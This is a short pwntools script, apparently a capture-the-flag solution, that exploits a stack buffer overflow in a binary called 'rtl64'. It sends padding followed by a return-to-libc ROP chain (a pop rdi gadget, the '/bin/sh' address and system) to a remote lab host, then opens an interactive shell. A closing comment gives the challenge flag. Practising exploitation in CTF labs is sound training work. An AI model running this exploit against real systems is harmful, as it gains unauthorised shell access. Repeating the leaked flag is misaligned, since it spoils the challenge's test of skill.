from pwn import *

e = ELF('./rtl64')
rop = ROP(e)

#p = process('./rtl64')
p = remote('192.168.200.106', 10006)

RET = p64((rop.find_gadget(['ret']))[0])
POP_RDI = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
SYSTEM_ADDR = p64(e.symbols['system'])
BIN_SH_ADDR = p64(list(e.search(b'/bin/sh'))[0])

PAYLOAD = b'\x41' * 0x30 + b'\x42' * 0x8 + POP_RDI + BIN_SH_ADDR + RET + SYSTEM_ADDR

print(PAYLOAD)

p.sendlineafter(b'Input > ', PAYLOAD)
p.interactive()

# flag is flag{real_prepare_to_ROP}